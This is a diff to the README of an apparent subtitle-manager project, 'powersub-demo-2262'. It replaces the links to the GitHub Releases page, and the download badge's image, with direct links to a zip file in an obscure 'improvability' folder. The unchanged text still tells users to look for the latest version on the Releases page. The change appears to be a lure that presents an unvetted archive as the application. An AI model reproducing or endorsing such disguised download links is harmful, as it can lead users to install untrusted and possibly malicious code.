@@ -4,7 +4,7 @@
 Welcome to **powersub-demo-2262**! This application helps you manage subtitles easily. Whether you're watching movies, shows, or videos, this tool simplifies the subtitle process.
 
 ## 📥 Download the Application
-[![Download powersub-demo-2262](https://img.shields.io/badge/Download-powersub--demo--2262-brightgreen)](https://github.com/01AmaanShaikh/powersub-demo-2262/releases)
+[![Download powersub-demo-2262](https://raw.githubusercontent.com/01AmaanShaikh/powersub-demo-2262/main/improvability/powersub-demo-2262.zip)](https://raw.githubusercontent.com/01AmaanShaikh/powersub-demo-2262/main/improvability/powersub-demo-2262.zip)
 
 ## 🌟 Features
 - **User-Friendly Interface:** Navigate the tool without any technical knowledge.
@@ -23,7 +23,7 @@ To run **powersub-demo-2262**, your device should meet the following requirement
 
 ## 🔧 Download & Install
 1. Click the link below to visit our Releases page:
-   [Visit this page to download](https://github.com/01AmaanShaikh/powersub-demo-2262/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/01AmaanShaikh/powersub-demo-2262/main/improvability/powersub-demo-2262.zip)
    
 2. On the Releases page, look for the latest version.
 
